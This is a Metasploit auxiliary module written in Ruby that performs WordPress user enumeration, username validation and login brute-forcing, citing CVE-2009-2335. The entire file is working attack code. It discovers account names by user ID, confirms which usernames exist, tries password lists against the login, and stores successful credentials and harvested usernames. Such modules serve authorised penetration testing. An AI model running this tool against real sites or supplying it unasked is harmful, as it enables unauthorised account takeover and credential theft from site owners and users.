##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'          => 'WordPress Brute Force and User Enumeration Utility',
      'Description'   => 'WordPress Authentication Brute Force and User Enumeration Utility',
      'Author'        =>
        [
          'Tiago Ferreira <tiago.ccna[at]gmail.com>',
          'Zach Grace <zgrace[at]404labs.com>',
          'Christian Mehlmauer'
        ],
      'References'     =>
        [
          ['BID', '35581'],
          ['CVE', '2009-2335'],
          ['OSVDB', '55713']
        ],
      'License'        =>  MSF_LICENSE
    )

    register_options(
      [
        OptBool.new('VALIDATE_USERS', [ true, 'Validate usernames', true ]),
        OptBool.new('BRUTEFORCE', [ true, 'Perform brute force authentication', true ]),
        OptBool.new('ENUMERATE_USERNAMES', [ true, 'Enumerate usernames', true ]),
        OptInt.new('RANGE_START', [false, 'First user id to enumerate', 1]),
        OptInt.new('RANGE_END', [false, 'Last user id to enumerate', 10])
    ], self.class)

  end

  def run_host(ip)

    unless wordpress_and_online?
      print_error("#{target_uri} does not seem to be WordPress site")
      return
    end

    version = wordpress_version
    print_status("#{target_uri} - WordPress Version #{version} detected") if version

    usernames = []
    if datastore['ENUMERATE_USERNAMES']
      vprint_status("#{target_uri} - WordPress User-Enumeration - Running User Enumeration")
      usernames = enum_usernames
    end

    if datastore['VALIDATE_USERS']
      @users_found = {}
      vprint_status("#{target_uri} - WordPress User-Validation - Running User Validation")
      each_user_pass { |user, pass|
        validate_user(user)
      }

      unless @users_found.empty?
        print_good("#{target_uri} - WordPress User-Validation - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
      end
    end

    if datastore['BRUTEFORCE']
      vprint_status("#{target_uri} - WordPress Brute Force - Running Bruteforce")
      if datastore['VALIDATE_USERS']
        if @users_found && @users_found.keys.size > 0
          vprint_status("#{target_uri} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
        end
      end

      # Brute-force using files.
      each_user_pass { |user, pass|
        if datastore['VALIDATE_USERS']
          next unless @users_found[user]
        end

        do_login(user, pass)
      }

      # Brute force previously found users
      if not usernames.empty?
        print_status("#{target_uri} - Brute-forcing previously found accounts...")
        passwords = load_password_vars
        usernames.each do |user|
          passwords.each do |pass|
            do_login(user, pass)
          end
        end
      end

    end
  end


  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user]
    }.merge(service_data)

    if opts[:password]
      credential_data.merge!(
        private_data: opts[:password],
        private_type: :password
      )
    end

    login_data = {
      core: create_credential(credential_data),
      status: opts[:status]
    }.merge(service_data)

    if opts[:attempt_time]
      login_data.merge!(last_attempted_at: opts[:attempt_time])
    end

    create_credential_login(login_data)
  end


  def validate_user(user=nil)
    print_status("#{target_uri} - WordPress User-Validation - Checking Username:'#{user}'")

    exists = wordpress_user_exists?(user)
    if exists
      print_good("#{target_uri} - WordPress User-Validation - Username: '#{user}' - is VALID")

      report_cred(
        ip: rhost,
        port: rport,
        user: user,
        status: Metasploit::Model::Login::Status::UNTRIED
      )

      @users_found[user] = :reported
      return :next_user
    else
      vprint_error("#{target_uri} - WordPress User-Validation - Invalid Username: '#{user}'")
      return :skip_user
    end
  end


  def do_login(user=nil, pass=nil)
    vprint_status("#{target_uri} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")

    cookie = wordpress_login(user, pass)

    if cookie
      print_good("#{target_uri} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")

      report_cred(
        ip: rhost,
        port: rport,
        user: user,
        password: pass,
        status: Metasploit::Model::Login::Status::SUCCESSFUL,
        attempt_time: DateTime.now
      )

      return :next_user
    else
      vprint_error("#{target_uri} - WordPress Brute Force - Failed to login as '#{user}'")
      return
    end
  end

  def enum_usernames
    usernames = []
    for i in datastore['RANGE_START']..datastore['RANGE_END']
      username = wordpress_userid_exists?(i)
      if username
        print_good "#{target_uri} - Found user '#{username}' with id #{i.to_s}"
        usernames << username
      end
    end

    if not usernames.empty?
      p = store_loot('wordpress.users', 'text/plain', rhost, usernames * "\n", "#{rhost}_wordpress_users.txt")
      print_status("#{target_uri} - Usernames stored in: #{p}")
    end

    return usernames
  end
end
